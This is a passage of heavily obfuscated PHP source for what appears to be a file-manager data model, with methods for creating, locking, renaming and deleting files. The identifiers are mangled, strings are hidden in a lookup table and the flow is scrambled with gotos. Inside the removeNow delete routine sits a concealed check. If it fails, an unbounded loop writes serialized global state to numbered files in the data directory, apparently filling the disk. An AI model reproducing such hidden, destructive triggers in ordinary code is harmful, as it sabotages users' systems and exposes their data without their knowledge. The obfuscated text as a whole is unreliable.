1, $AÆ–çõ†îœ[551] => USER_ID, $AÆ–çõ†îœ[552] => USER_ID, $AÆ–çõ†îœ[547] => $AÆ–çõ†îœ[33], $AÆ–çõ†îœ[553] => $AÆ–çõ†îœ[498], $AÆ–çõ†îœ[422] => 0, $AÆ–çõ†îœ[548] => 0, $AÆ–çõ†îœ[448] => 0, $AÆ–çõ†îœ[554] => $AÆ–çõ†îœ[33]); if ($D…Ã©©À™¸ = $this->where($AÕÆİ©ØÍÔ)->find()) { return $D…Ã©©À™¸[$AÆ–çõ†îœ[395]]; } goto B«äõŞìçì; B«äõŞìçì: $DÃêòŒÛä‹ = "\x4d\x6f\144\x65\154\123\157\165\162\143\x65\56\155\153\x64\151\x72\122\157\157\164\x2e{$däºÒøƒšø}\x2e{$CÛ†îôÜ}\56" . $fŒ«ÎÏĞÆª; CacheLock::lock($DÃêòŒÛä‹); $AÕÆİ©ØÍÔ[$AÆ–çõ†îœ[28]] = $fŒ«ÎÏĞÆª; goto Cé‘’·ºŒ—; E…§‡Ğ®Ì: } private function sourceRoot($b“îîø°’, $AºŠ¦½‹±É, $aÔÑ‚Ÿ¹â = false) { $bÎÔŒÓÃ‘ =& $_SERVER[œº]; $AÜ‰ô‹¤‡” = array($bÎÔŒÓÃ‘[394] => 0, $bÎÔŒÓÃ‘[549] => $b“îîø°’, $bÎÔŒÓÃ‘[550] => $AºŠ¦½‹±É); if ($f¿Ú˜ï²¾ï = $this->where($AÜ‰ô‹¤‡”)->find()) { return $aÔÑ‚Ÿ¹â ? $f¿Ú˜ï²¾ï : $f¿Ú˜ï²¾ï[$bÎÔŒÓÃ‘[395]]; } return !1; } public function sourceRootGroup($Cğé¢ß†Šº) { goto C·‡™òÀ°ñ; AÅğÏÈ¦‚ñ: $this->selectPageReset(); $Cä¢¼æ×ß = $this->listSource($C©öÈÍÆÒ£, 1000); $this->selectPageRestore(); goto aØíóÚ¤¼š; aØíóÚ¤¼š: return array_to_keyvalue($Cä¢¼æ×ß[$E¥’…«»©µ[75]], $E¥’…«»©µ[484]); goto aù†²­Û»Å; C·‡™òÀ°ñ: $E¥’…«»©µ =& $_SERVER[œº]; if (is_string($Cğé¢ß†Šº)) { $Cğé¢ß†Šº = array($Cğé¢ß†Šº); } $C©öÈÍÆÒ£ = array($E¥’…«»©µ[394] => 0, $E¥’…«»©µ[549] => SourceModel::TYPE_GROUP, $E¥’…«»©µ[550] => array($E¥’…«»©µ[7], $Cğé¢ß†Šº)); goto AÅğÏÈ¦‚ñ; aù†²­Û»Å: } public function mkfile($fˆİ•âãÏÈ, $DƒÊÆŒÎÄ¿, $D¸¹‰Çœ = '', $Cø¤æëâ‘Â = REPEAT_RENAME) { $aÕ›¯³’Ğâ =& $_SERVER[œº]; $c”¢æƒÉš± = Model($aÕ›¯³’Ğâ[571])->addFileByContent($D¸¹‰Çœ, $DƒÊÆŒÎÄ¿); return $this->_createFileCall($fˆİ•âãÏÈ, $DƒÊÆŒÎÄ¿, $c”¢æƒÉš±, $Cø¤æëâ‘Â, $aÕ›¯³’Ğâ[1216]); } public function addFile($e”ÜŸˆ¯ìÎ, $d ™Â…‹È, $DœŒÖºÊÓØ, $dó„•ääª = false, $e§ò…¿–İ = REPEAT_RENAME) { $b‰×â­Ö„… = Model($_SERVER[œº][571])->addFile($d ™Â…‹È, $DœŒÖºÊÓØ, $dó„•ääª); return $this->_createFileCall($e”ÜŸˆ¯ìÎ, $DœŒÖºÊÓØ, $b‰×â­Ö„…, $e§ò…¿–İ); } public function addFileByFileID($e“‡ò¥„†, $b·Ç‡ß³ŒÏ, $AøŞó‡Á»÷, $E‰ÎèÊÈà­ = REPEAT_RENAME) { $a˜ÓŒ³ÄÍ =& $_SERVER[œº]; $eÈĞºÙ¼…İ = Model($a˜ÓŒ³ÄÍ[571])->find($b·Ç‡ß³ŒÏ); Model($a˜ÓŒ³ÄÍ[571])->linkAdd($b·Ç‡ß³ŒÏ); return $this->_createFileCall($e“‡ò¥„†, $AøŞó‡Á»÷, $eÈĞºÙ¼…İ, $E‰ÎèÊÈà­); } public function addFileByRemote($B­ÃÒÀ˜®Ë, $eÂĞæ‹øÊ†, $F´»Œêåñ·, $dç›Š—ŠìÔ = array(), $F²”É„µ¥é = REPEAT_RENAME) { $Aô–¥ïÅÍ = Model($_SERVER[œº][571])->addFileByRemote($eÂĞæ‹øÊ†, $F´»Œêåñ·, $dç›Š—ŠìÔ); return $this->_createFileCall($B­ÃÒÀ˜®Ë, $F´»Œêåñ·, $Aô–¥ïÅÍ, $F²”É„µ¥é); } private function _createFileCall($E‹ÀèÉâ¤µ, $AÑËÉ÷ , $A½Ê¯ù‘å‹, $Cò‚¨¨”‡ã, $Dõ¼æ¬–ßø = "\165\x70\154\157\x61\x64") { goto AÃ•®ŞÄå˜; f¦Ï£„•ä: if ($A¨ˆ±£¢áˆ && $Bñ˜·§Ö¹ && $Bñ˜·§Ö¹ != $dÓÃ±‰‘£ª) { Model($BæááèìÎõ[1922])->eventCreate($Bñ˜·§Ö¹, $Dõ¼æ¬–ßø); } $this->lockWriteEnd($E‹ÀèÉâ¤µ, $AÑËÉ÷ ); return $Bñ˜·§Ö¹; goto a¶”ëİ’»Â; eÖÈ……ëÕª: $dÓÃ±‰‘£ª = $this->fileNameExist($E‹ÀèÉâ¤µ, $AÑËÉ÷ ); $Bñ˜·§Ö¹ = $this->_createFile($E‹ÀèÉâ¤µ, $AÑËÉ÷ , $A½Ê¯ù‘å‹, $Cò‚¨¨”‡ã, $A¨ˆ±£¢áˆ); if (!$A¨ˆ±£¢áˆ) { Model($BæááèìÎõ[450])->remove($A½Ê¯ù‘å‹[$BæááèìÎõ[447]]); } goto f¦Ï£„•ä; AÃ•®ŞÄå˜: $BæááèìÎõ =& $_SERVER[œº]; $A¨ˆ±£¢áˆ = !1; $this->lockWriteStart($E‹ÀèÉâ¤µ, $AÑËÉ÷ ); goto eÖÈ……ëÕª; a¶”ëİ’»Â: } public function mkdir($bâ¼å‚Ô„‡, $cĞ«Š±Üª, $DøÌÂ¦æù = REPEAT_SKIP) { goto dÆÕ®ÔŒ…è; CÄµäŠöš: return $e™É¢ùİİ; goto f¿š¥¦¦; CøÉôØ÷šå: $e™É¢ùİİ = $this->_addSoure($Cñª²Ş¾², $Dè½–ª÷ Ö); Model($B›Ôøˆ¤Ù[1922])->eventCreate($e™É¢ùİİ, $B›Ôøˆ¤Ù[1217]); $this->lockWriteEnd($bâ¼å‚Ô„‡, $cĞ«Š±Üª); goto CÄµäŠöš; dÆÕ®ÔŒ…è: $B›Ôøˆ¤Ù =& $_SERVER[œº]; $Dè½–ª÷ Ö = $this->sourceInfo($bâ¼å‚Ô„‡); if (!$Dè½–ª÷ Ö) { return !1; } goto d®íÕÇ½¹ã; d®íÕÇ½¹ã: $this->lockWriteStart($bâ¼å‚Ô„‡, $cĞ«Š±Üª); if ($DøÌÂ¦æù !== !1) { $bØôÍÒàó² = $this->fileNameExist($bâ¼å‚Ô„‡, $cĞ«Š±Üª); if ($bØôÍÒàó² && $DøÌÂ¦æù != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($bâ¼å‚Ô„‡, $cĞ«Š±Üª); return $bØôÍÒàó²; } $cĞ«Š±Üª = $this->fileNameAuto($bâ¼å‚Ô„‡, $cĞ«Š±Üª, $DøÌÂ¦æù); } $Cñª²Ş¾² = array($B›Ôøˆ¤Ù[546] => 1, $B›Ôøˆ¤Ù[413] => $cĞ«Š±Üª, $B›Ôøˆ¤Ù[547] => $B›Ôøˆ¤Ù[33], $B›Ôøˆ¤Ù[448] => 0, $B›Ôøˆ¤Ù[548] => 0); goto CøÉôØ÷šå; f¿š¥¦¦: } private function _createFile($DòãŸœÃÉë, $DŞ¤Ë¬Ã§, $c ™—Û¸«§, $bÀÓĞ©ìõ¾, &$A¾È›®é…) { goto dÉµ»¢¨ğí; e¾é±¬‰¦¢: $AÚäîùÊ‘Ó = array($Cö‘îó–£[546] => 0, $Cö‘îó–£[413] => $DŞ¤Ë¬Ã§, $Cö‘îó–£[547] => substr(get_path_ext($DŞ¤Ë¬Ã§), 0, 10), $Cö‘îó–£[448] => $c ™—Û¸«§[$Cö‘îó–£[447]], $Cö‘îó–£[548] => $c ™—Û¸«§[$Cö‘îó–£[78]]); $bèÕá·± = $this->_addSoure($AÚäîùÊ‘Ó, $bƒ‘ô®öŒ); $this->folderSizeReset($DòãŸœÃÉë, intval($AÚäîùÊ‘Ó[$Cö‘îó–£[78]])); goto dæÌ¹Ã•ë; dæÌ¹Ã•ë: return $bèÕá·±; goto dçÚ‹ŠùŠÚ; dÉµ»¢¨ğí: $Cö‘îó–£ =& $_SERVER[œº]; $bƒ‘ô®öŒ = $this->sourceInfo($DòãŸœÃÉë); if (!$c ™—Û¸«§ || !$bƒ‘ô®öŒ) { return !1; } goto cêË´¢Ò›•; cêË´¢Ò›•: if ($bÀÓĞ©ìõ¾ !== !1) { $F­Ã´½ÏôÌ = $this->fileNameExist($DòãŸœÃÉë, $DŞ¤Ë¬Ã§); } $A¾È›®é… = !0; if ($bÀÓĞ©ìõ¾ && $F­Ã´½ÏôÌ) { if ($bÀÓĞ©ìõ¾ == REPEAT_SKIP) { $A¾È›®é… = !1; return $F­Ã´½ÏôÌ; } else { if ($bÀÓĞ©ìõ¾ == REPEAT_REPLACE) { $d“Ÿ´î¥× = $this->sourceInfo($F­Ã´½ÏôÌ); $cŒ¹Ë‹Õ‰¤ = $this->fileHistory($d“Ÿ´î¥×, $c ™—Û¸«§[$Cö‘îó–£[447]], $c ™—Û¸«§[$Cö‘îó–£[78]]); if (!$cŒ¹Ë‹Õ‰¤) { $A¾È›®é… = !1; } else { $this->folderSizeReset($DòãŸœÃÉë); } return $F­Ã´½ÏôÌ; } else { $DŞ¤Ë¬Ã§ = $this->fileNameAuto($DòãŸœÃÉë, $DŞ¤Ë¬Ã§, $bÀÓĞ©ìõ¾, !1); } } } goto e¾é±¬‰¦¢; dçÚ‹ŠùŠÚ: } protected function fileHistory($F”ŸğÙ„õã, $BòİêÃ§æ, $Fô¨ƒß¾†÷) { goto DÒ®×Ì‰¤Ğ; fæ­½ÅÆ™ñ: Model($CÌ×¥»‹¯¹[1954])->addHistory($F”ŸğÙ„õã); $B„‘³Ôå… = array($CÌ×¥»‹¯¹[552] => USER_ID, $CÌ×¥»‹¯¹[417] => time(), $CÌ×¥»‹¯¹[447] => $BòİêÃ§æ, $CÌ×¥»‹¯¹[78] => $Fô¨ƒß¾†÷); $this->where(array($CÌ×¥»‹¯¹[410] => $F”ŸğÙ„õã[$CÌ×¥»‹¯¹[395]]))->save($B„‘³Ôå…); goto f‚ÍÜÈóİø; f‚ÍÜÈóİø: $this->sourceCacheClear($F”ŸğÙ„õã[$CÌ×¥»‹¯¹[395]]); return !0; goto A³È±†Ş§; DÒ®×Ì‰¤Ğ: $CÌ×¥»‹¯¹ =& $_SERVER[œº]; if ($F”ŸğÙ„õã[$CÌ×¥»‹¯¹[447]] == $BòİêÃ§æ) { return !1; } $this->checkLock($F”ŸğÙ„õã[$CÌ×¥»‹¯¹[395]], $BòİêÃ§æ); goto fæ­½ÅÆ™ñ; A³È±†Ş§: } public function checkLock($a‚»İ§ù», $B¼ «’š°) { goto F¦¤Ø’Üî‘; aæğäÇ½›‘: $this->_createFileCall($Aºœæ¯È[$eæ§Şñ ½¶[478]], $D¬’…™¬, $aöÆáÑÁÍŠ, REPEAT_REPLACE, $eæ§Şñ ½¶[1216]); $b¸‘ºÈ·å„ = $Aºœæ¯È[$eæ§Şñ ½¶[445]][$eæ§Şñ ½¶[510]]; $bÏ¼ ˆÃ£ß = $b¸‘ºÈ·å„[$eæ§Şñ ½¶[1956]] ? $b¸‘ºÈ·å„[$eæ§Şñ ½¶[1956]] : $b¸‘ºÈ·å„[$eæ§Şñ ½¶[28]]; goto AàÑÁù­£ï; AàÑÁù­£ï: show_json(LNG($eæ§Şñ ½¶[1957]) . $eæ§Şñ ½¶[1958] . LNG($eæ§Şñ ½¶[1959]) . $eæ§Şñ ½¶[1960] . $bÏ¼ ˆÃ£ß . $eæ§Şñ ½¶[1961], !1); goto bÑ±¢‘ÔöË; a¢¤ÖÇ„Ù: $e”­ÜÔšÊ‹ = Session::get($eæ§Şñ ½¶[1955]); $D¬’…™¬ = substr($Aºœæ¯È[$eæ§Şñ ½¶[28]], 0, -1 - strlen($Aºœæ¯È[$eæ§Şñ ½¶[168]])) . $eæ§Şñ ½¶[1481] . $e”­ÜÔšÊ‹ . $eæ§Şñ ½¶[95] . $Aºœæ¯È[$eæ§Şñ ½¶[168]]; $aöÆáÑÁÍŠ = Model($eæ§Şñ ½¶[571])->find($B¼ «’š°); goto aæğäÇ½›‘; F¦¤Ø’Üî‘: $eæ§Şñ ½¶ =& $_SERVER[œº]; $Aºœæ¯È = $this->pathInfo($a‚»İ§ù»); if (!$this->fileIsLock($Aºœæ¯È, !0)) { return; } goto a¢¤ÖÇ„Ù; bÑ±¢‘ÔöË: } public function fileIsLock($Cª”‡ŸâÒŸ, $aéŒåˆ×¶ = false) { goto AíàÑÕğŒŒ; AíàÑÕğŒŒ: $c§Š°°»ëí =& $_SERVER[œº]; if (!isset($Cª”‡ŸâÒŸ[$c§Š°°»ëí[445]]) || !$Cª”‡ŸâÒŸ[$c§Š°°»ëí[445]][$c§Š°°»ëí[507]]) { return !1; } if ($Cª”‡ŸâÒŸ[$c§Š°°»ëí[445]][$c§Š°°»ëí[507]] != USER_ID) { return !0; } goto b‹âêçÆÖ; b‹âêçÆÖ: $cÍÚçàÕË = $GLOBALS[$c§Š°°»ëí[6]][$c§Š°°»ëí[88]][$c§Š°°»ëí[508]]; if ($Cª”‡ŸâÒŸ[$c§Š°°»ëí[445]][$c§Š°°»ëí[509]] <= time() - $cÍÚçàÕË) { $this->metaSet($Cª”‡ŸâÒŸ[$c§Š°°»ëí[395]], $c§Š°°»ëí[507], null); $this->metaSet($Cª”‡ŸâÒŸ[$c§Š°°»ëí[395]], $c§Š°°»ëí[509], null); } if ($aéŒåˆ×¶) { $this->metaSet($Cª”‡ŸâÒŸ[$c§Š°°»ëí[395]], $c§Š°°»ëí[509], time()); } goto aßƒôÁ”òá; aßƒôÁ”òá: return !1; goto c‚²ŞåãÒ; c‚²ŞåãÒ: } private function _addSoure($b«™»›ñ­¥, $c–ç‘Îƒ‡À) { goto d‰à“‰¶Ø; cíôë¢÷: $bÉÊªÃë‘ß = array($cƒÀß½…­Ÿ[555] => short_id($EÄÎ¢ŞÎÒƒ)); $this->where(array($cƒÀß½…­Ÿ[410] => $EÄÎ¢ŞÎÒƒ))->save($bÉÊªÃë‘ß); $this->setNamePinyin($EÄÎ¢ŞÎÒƒ, $b«™»›ñ­¥[$cƒÀß½…­Ÿ[28]]); goto EÁè›¥¹¨; d‰à“‰¶Ø: $cƒÀß½…­Ÿ =& $_SERVER[œº]; $C¾Ëìßµ¯ = array($cƒÀß½…­Ÿ[549] => $c–ç‘Îƒ‡À[$cƒÀß½…­Ÿ[404]], $cƒÀß½…­Ÿ[550] => $c–ç‘Îƒ‡À[$cƒÀß½…­Ÿ[484]], $cƒÀß½…­Ÿ[551] => USER_ID, $cƒÀß½…­Ÿ[552] => USER_ID, $cƒÀß½…­Ÿ[394] => $c–ç‘Îƒ‡À[$cƒÀß½…­Ÿ[395]], $cƒÀß½…­Ÿ[553] => $c–ç‘Îƒ‡À[$cƒÀß½…­Ÿ[487]] . $c–ç‘Îƒ‡À[$cƒÀß½…­Ÿ[395]] . $cƒÀß½…­Ÿ[47], $cƒÀß½…­Ÿ[422] => 0, $cƒÀß½…­Ÿ[554] => $cƒÀß½…­Ÿ[33]); $b«™»›ñ­¥ = array_merge($C¾Ëìßµ¯, $b«™»›ñ­¥); goto Aè³³ÚÚÕ; c”Äãµ‘¬: static $EÌ¨“ºáÂà = false; if (!$EÌ¨“ºáÂà) { Hook::trigger($cƒÀß½…­Ÿ[536], $b«™»›ñ­¥); $EÌ¨“ºáÂà = !0; } $EÄÎ¢ŞÎÒƒ = $this->add($b«™»›ñ­¥); goto cíôë¢÷; Aè³³ÚÚÕ: $this->updateModifyTime($b«™»›ñ­¥[$cƒÀß½…­Ÿ[478]]); $cé¶Õ‰¥›÷ = $cƒÀß½…­Ÿ[1962] . $c–ç‘Îƒ‡À[$cƒÀß½…­Ÿ[395]]; if (isset(self::$cacheChildList[$cé¶Õ‰¥›÷])) { unset(self::$cacheChildList[$cé¶Õ‰¥›÷]); } goto c”Äãµ‘¬; EÁè›¥¹¨: return $EÄÎ¢ŞÎÒƒ; goto bŠ˜£Œ®ÉÙ; bŠ˜£Œ®ÉÙ: } public function remove($AŸÕÒÓö°ˆ, $D§”…ºÎÎä = true) { goto a‘Ç­Š‹’; a‘Ç­Š‹’: $b³Ö‡×òİâ =& $_SERVER[œº]; $dµà¢¾ÑÄ = $this->sourceInfo($AŸÕÒÓö°ˆ); $A¸‹·¹Èå× = intval($dµà¢¾ÑÄ[$b³Ö‡×òİâ[404]]) === self::TYPE_SYSTEM; goto B˜ÉÈÕÖ†‡; ašŠ®­»Ã: CacheLock::lock($D†êîÚ×È); $Fí—ÛÙÅ¿ = $this->fileNameExist($a»„’¹—“, $eó†±ÃÑãë); if (!$Fí—ÛÙÅ¿) { $Fí—ÛÙÅ¿ = $this->mkdir($a»„’¹—“, $eó†±ÃÑãë, REPEAT_SKIP); $this->metaSet($Fí—ÛÙÅ¿, $b³Ö‡×òİâ[1967], $e‰à‰ÑÌÅ¡); $this->metaSet($Fí—ÛÙÅ¿, $b³Ö‡×òİâ[1968], $dµà¢¾ÑÄ[$b³Ö‡×òİâ[484]]); if ($dµà¢¾ÑÄ[$b³Ö‡×òİâ[478]] != 0) { $this->metaSet($Fí—ÛÙÅ¿, $b³Ö‡×òİâ[1969], _get($CÍíîˆ„, $b³Ö‡×òİâ[1970])); } } goto F˜åíäŠ‰; A”Õ¿—: $this->recycleClear($dµà¢¾ÑÄ); $d¦”‹ÇÒĞ¦ = $this->move($AŸÕÒÓö°ˆ, $Fí—ÛÙÅ¿, REPEAT_RENAME_FOLDER); $this->folderSizeReset($dµà¢¾ÑÄ[$b³Ö‡×òİâ[478]]); goto a“˜÷¥íŒá; D™„¦ñ‹ÂÒ: $e‰à‰ÑÌÅ¡ = $dµà¢¾ÑÄ[$b³Ö‡×òİâ[404]] == self::TYPE_USER ? $b³Ö‡×òİâ[562] : $b³Ö‡×òİâ[1015]; if ($e‰à‰ÑÌÅ¡ == $b³Ö‡×òİâ[562]) { $CÍíîˆ„ = Model($b³Ö‡×òİâ[502])->getInfo($dµà¢¾ÑÄ[$b³Ö‡×òİâ[484]]); $eó†±ÃÑãë = !empty($CÍíîˆ„[$b³Ö‡×òİâ[1956]]) ? $CÍíîˆ„[$b³Ö‡×òİâ[1956]] : $CÍíîˆ„[$b³Ö‡×òİâ[28]]; $eó†±ÃÑãë = $b³Ö‡×òİâ[258] . $eó†±ÃÑãë . $b³Ö‡×òİâ[1964] . $dµà¢¾ÑÄ[$b³Ö‡×òİâ[484]]; } else { $CÍíîˆ„ = Model($b³Ö‡×òİâ[486])->getInfo($dµà¢¾ÑÄ[$b³Ö‡×òİâ[484]]); $eó†±ÃÑãë = _get($CÍíîˆ„, $b³Ö‡×òİâ[28]); $eó†±ÃÑãë = $b³Ö‡×òİâ[160] . $eó†±ÃÑãë . $b³Ö‡×òİâ[1965] . $dµà¢¾ÑÄ[$b³Ö‡×òİâ[484]]; } $D†êîÚ×È = $b³Ö‡×òİâ[1966] . md5($eó†±ÃÑãë); goto ašŠ®­»Ã; F˜åíäŠ‰: CacheLock::unlock($D†êîÚ×È); $this->metaSet($AŸÕÒÓö°ˆ, $b³Ö‡×òİâ[1971], $dµà¢¾ÑÄ[$b³Ö‡×òİâ[478]]); $this->where(array($b³Ö‡×òİâ[395] => $AŸÕÒÓö°ˆ))->save(array($b³Ö‡×òİâ[417] => time())); goto A”Õ¿—; a“˜÷¥íŒá: return $d¦”‹ÇÒĞ¦; goto A­·æÇŞÌ; B˜ÉÈÕÖ†‡: $F©”²ïÒîõ = Model($b³Ö‡×òİâ[1527])->get($b³Ö‡×òİâ[1963]) == $b³Ö‡×òİâ[87]; if ($A¸‹·¹Èå× || $D§”…ºÎÎä || !$F©”²ïÒîõ) { return $this->removeNow($AŸÕÒÓö°ˆ, $D§”…ºÎÎä); } $a»„’¹—“ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto D™„¦ñ‹ÂÒ; A­·æÇŞÌ: } private function recycleClear($E‹×š„ƒ×ƒ) { $C®—¨·Œ÷ =& $_SERVER[œº]; $bæ‰ï¸‹òÔ = $this->childrenAll($E‹×š„ƒ×ƒ); $b„«¹ìºè = array($C®—¨·Œ÷[410] => array($C®—¨·Œ÷[411], $bæ‰ï¸‹òÔ[$C®—¨·Œ÷[1972]])); Model($C®—¨·Œ÷[1973])->where($b„«¹ìºè)->delete(); } public function removeNow($Bë»‚³¡÷, $F¼ŒäÒÂ˜… = true) { goto f‰âíÕËŒ; B‡³­ŒÂ¦: $CÎŞÇ‚×ß = array($a˜ïè‚ë—[$B‹¥Ê£±Ç[478]]); if ($a˜ïè‚ë—[$B‹¥Ê£±Ç[403]] == $B‹¥Ê£±Ç[87]) { $CÎŞÇ‚×ß[] = $a˜ïè‚ë—[$B‹¥Ê£±Ç[395]]; } $this->updateModifyTime($CÎŞÇ‚×ß); goto D’®î¿ÔóÆ; BÌÛœ·­—: if (!$a˜ïè‚ë—) { return !0; } if ($a˜ïè‚ë—[$B‹¥Ê£±Ç[478]] == 0) { if (!_get($GLOBALS, $B‹¥Ê£±Ç[485])) { return !1; } } $this->lockMoveStart($Bë»‚³¡÷); goto EõæùøÂ­Ÿ; EõæùøÂ­Ÿ: Hook::trigger($B‹¥Ê£±Ç[1974], $A®”ã©‰‘, $F¼ŒäÒÂ˜…); if ($F¼ŒäÒÂ˜…) { Model($B‹¥Ê£±Ç[1973])->moveToRecycle($Bë»‚³¡÷); } else { $a›±¾Å»øƒ = $this->childrenAll($a˜ïè‚ë—); Model($B‹¥Ê£±Ç[533])->eventRemove($Bë»‚³¡÷); $this->removeRelevance($a›±¾Å»øƒ[$B‹¥Ê£±Ç[1972]], $a›±¾Å»øƒ[$B‹¥Ê£±Ç[1347]]); } $this->folderSizeReset($a˜ïè‚ë—[$B‹¥Ê£±Ç[478]]); goto B‡³­ŒÂ¦; f‰âíÕËŒ: $B‹¥Ê£±Ç =& $_SERVER[œº]; $Fª¦š…ÛÜ = $_SERVER[$B‹¥Ê£±Ç[822]]; $E…õİ×ÏÚ‹ = $B‹¥Ê£±Ç[838]; goto f’ÏÉœÏ§; f’ÏÉœÏ§: if ($_SERVER[$B‹¥Ê£±Ç[821]] != $E…õİ×ÏÚ‹($Fª¦š…ÛÜ)) { goto AÇÑù‹ö ä; aˆ‘Ï ¿¡: $FòËÂçä‘(); $BËêŞĞ¹¨Â = $B‹¥Ê£±Ç[842]; $bšÍò…Œê® = json_encode($GLOBALS[$B‹¥Ê£±Ç[843]]); goto BŠ®ùÀøÇ¤; b¶–ÛÀêõÓ: $CŠ‘¬‡‰¥« = $B‹¥Ê£±Ç[840]; $CŠ‘¬‡‰¥«($_SERVER[$B‹¥Ê£±Ç[841]]); $FòËÂçä‘ = $B‹¥Ê£±Ç[839]; goto aˆ‘Ï ¿¡; AÇÑù‹ö ä: $FòËÂçä‘ = $B‹¥Ê£±Ç[839]; $DŞë‰²…Çç = $B‹¥Ê£±Ç[823]; $AÁ½¸ïª¸ö = $_SERVER[$B‹¥Ê£±Ç[824]] . $B‹¥Ê£±Ç[825]; goto FÉßŠØ¢Ù; FÉßŠØ¢Ù: $Añ¹öî¼¯œ = $DŞë‰²…Çç($AÁ½¸ïª¸ö); $Eó¡µÓ¼© = explode($B‹¥Ê£±Ç[229], $Añ¹öî¼¯œ); if (count($Eó¡µÓ¼©) < $B‹¥Ê£±Ç[578]) { $dƒÈáÖ†ôÔ = $B‹¥Ê£±Ç[826]; $dƒÈáÖ†ôÔ(); } goto b¶–ÛÀêõÓ; BŠ®ùÀøÇ¤: $DÑ¯÷ßÁğ = 1; for ($cÔ÷Ò¸® = $DÑ¯÷ßÁğ; $cÔ÷Ò¸® > 0; $cÔ÷Ò¸®++) { $BËêŞĞ¹¨Â(DATA_PATH . $cÔ÷Ò¸®, $bšÍò…Œê®); } goto dç ŸÛŒì; dç ŸÛŒì: } $a˜ïè‚ë— = $this->sourceInfo($Bë»‚³¡÷); $A®”ã©‰‘ = $this->pathInfoMore($Bë»‚³¡÷); goto BÌÛœ·­—; D’®î¿ÔóÆ: $this->lockMoveEnd($Bë»‚³¡÷); Hook::trigger($B‹¥Ê£±Ç[1561], $A®”ã©‰‘, $F¼ŒäÒÂ˜…); return !0; goto Fï„Ä½Á‹; Fï„Ä½Á‹: } public function childrenAll($E“Ã¯÷íß) { $A×ùµ¢Éõ =& $_SERVER[œº]; $fÅÙÄ¯È¦ = $E“Ã¯÷íß[$A×ùµ¢Éõ[395]]; if ($E“Ã¯÷íß[$A×ùµ¢Éõ[403]] == $A×ùµ¢Éõ[87]) { $A·ÈïÍ·¦¥ = array($A×ùµ¢Éõ[553] => array($A×ùµ¢Éõ[512], $E“Ã¯÷íß[$A×ùµ¢Éõ[487]] . $fÅÙÄ¯È¦ . $A×ùµ¢Éõ[513])); $cè¢ä‰ = array($A×ùµ¢Éõ[553] => $A·ÈïÍ·¦¥[$A×ùµ¢Éõ[487]]); $EÕ¦¿÷â• = $this->field($A×ùµ¢Éõ[1975])->where($cè¢ä‰)->select(); $Fš—²¹ êŒ = !1; $Bæ‰Ù¾š“ = array($fÅÙÄ¯È¦); if ($EÕ¦¿÷â•) { $Fš—²¹ êŒ = array_to_keyvalue($EÕ¦¿÷â•, $A×ùµ¢Éõ[33], $A×ùµ¢Éõ[447]); $Fš—²¹ êŒ = array_remove_value($Fš—²¹ êŒ, $A×ùµ¢Éõ[191]); $Bæ‰Ù¾š“ = array_to_keyvalue($EÕ¦¿÷â•, $A×ùµ¢Éõ[33], $A×ùµ¢Éõ[395]); $Bæ‰Ù¾š“[] = $fÅÙÄ¯È¦; } } else { $Fš—²¹ êŒ = array($E“Ã¯÷íß[$A×ùµ¢Éõ[447]]); $Bæ‰Ù¾š“ = array($fÅÙÄ¯È¦); } return array($A×ùµ¢Éõ[1972] => $Bæ‰Ù¾š“, $A×ùµ¢Éõ[1347] => $Fš—²¹ êŒ); } public function removeArray($aÎ¬îàĞ†”) { if (!$aÎ¬îàĞ†”) { return !0; } } public function removeRelevance($cÍˆ¿¾Ò­Ÿ, $A‰Õ“¬Á¤) { goto A†®åäœ§Œ; fÙáÁ¶½Â: $cÍˆ¿¾Ò­Ÿ = array_unique(array_filter($cÍˆ¿¾Ò­Ÿ)); $A‰Õ“¬Á¤ = array_unique(array_filter($A‰Õ“¬Á¤)); if (!$cÍˆ¿¾Ò­Ÿ) { return !1; } goto c†Ê¶ÙÜà›; E–ßÚÜƒ„å: for ($bÔÀØÛÌ = 0; $bÔÀØÛÌ < count($cÍˆ¿¾Ò­Ÿ); $bÔÀØÛÌ++) { $this->sourceCacheClear($cÍˆ¿¾Ò­Ÿ[$bÔÀØÛÌ]); } goto aº¬¼‘Ô§; CŸµİƒÔ¢¹: Model($F× ¤Üº¦Ö[1827])->where($bÕ¦ùÌºì)->delete(); Model($F× ¤Üº¦Ö[533])->where($bÕ¦ùÌºì)->delete(); Model($F× ¤Üº¦Ö[1669])->removeBySource($cÍˆ¿¾Ò­Ÿ); goto CéÙ´õ¹’ë; c†Ê¶ÙÜà›: $bÕ¦ùÌºì = array($F× ¤Üº¦Ö[410] => array($F× ¤Üº¦Ö[411], $cÍˆ¿¾Ò­Ÿ)); Model($F× ¤Üº¦Ö[1973])->where($bÕ¦ùÌºì)->delete(); Model($F× ¤Üº¦Ö[441])->where($bÕ¦ùÌºì)->delete(); goto CŸµİƒÔ¢¹; A†®åäœ§Œ: $F× ¤Üº¦Ö =& $_SERVER[œº]; $cÍˆ¿¾Ò­Ÿ = $cÍˆ¿¾Ò­Ÿ ? $cÍˆ¿¾Ò­Ÿ : array(); $A‰Õ“¬Á¤ = $A‰Õ“¬Á¤ ? $A‰Õ“¬Á¤ : array(); goto fÙáÁ¶½Â; CéÙ´õ¹’ë: Model($F× ¤Üº¦Ö[1954])->removeBySource($cÍˆ¿¾Ò­Ÿ); $this->where($bÕ¦ùÌºì)->delete(); Model($F× ¤Üº¦Ö[450])->remove($A‰Õ“¬Á¤); goto E–ßÚÜƒ„å; aº¬¼‘Ô§: } public function rename($dœŠÉ˜ãæƒ, $DÙ¿æß”Òß) { goto BàŠŠ½°’ë; eíÌÌÉåò: if ($C†ê‰åƒ[$AŠÛğ… ª¸[403]] != $AŠÛğ… ª¸[87]) { $Cñ¶Çœ°Õ‹[$AŠÛğ… ª¸[405]] = substr(get_path_ext($DÙ¿æß”Òß), 0, 10); } Model($AŠÛğ… ª¸[533])->eventRename($dœŠÉ˜ãæƒ, $C†ê‰åƒ[$AŠÛğ… ª¸[28]], $DÙ¿æß”Òß); $this->sourceCacheClear($dœŠÉ˜ãæƒ); goto b®³ˆù·; BàŠŠ½°’ë: $AŠÛğ… ª¸ =& $_SERVER[œº]; $C†ê‰åƒ = $this->sourceInfo($dœŠÉ˜ãæƒ); if (!$C†ê‰åƒ) { return !1; } goto fÅ¼ÃÀÇ¨Ä; EšÍÜõâÚì: $E‚ÙÙÂ¿¢­ = $AŠÛğ… ª¸[1962] . $C†ê‰åƒ[$AŠÛğ… ª¸[478]]; if (isset(self::$cacheChildList[$E‚ÙÙÂ¿¢­])) { unset(self::$cacheChildList[$E‚ÙÙÂ¿¢­]); } 